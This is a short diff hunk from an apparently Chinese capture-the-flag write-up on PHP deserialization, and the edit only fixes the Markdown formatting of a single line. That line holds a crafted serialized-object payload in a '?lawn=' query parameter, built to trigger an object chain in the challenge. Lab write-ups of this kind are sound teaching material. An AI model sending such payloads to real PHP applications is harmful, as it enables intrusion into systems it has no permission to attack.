@@ -319,7 +319,7 @@ PHP反序列化漏洞
 
 ![魔法猫咪-3](https://raw.githubusercontent.com/StingerTeam/img\_bed/main/Pasted%20image%2020231224155620.png)
 
-构造paylod: ?lawn=O:9:"sunflower":1:{s:3:"sun";O:8:"eggplant":3:{s:3:"egg";b:1;s:5:"plant";O:3:"cat":0:{}s:6:"zombie";N;\}}\`
+构造paylod: `?lawn=O:9:"sunflower":1:{s:3:"sun";O:8:"eggplant":3:{s:3:"egg";b:1;s:5:"plant";O:3:"cat":0:{}s:6:"zombie";N;}}`
 
 ![魔法猫咪-4](https://raw.githubusercontent.com/StingerTeam/img\_bed/main/Pasted%20image%2020231224155413.png)
 
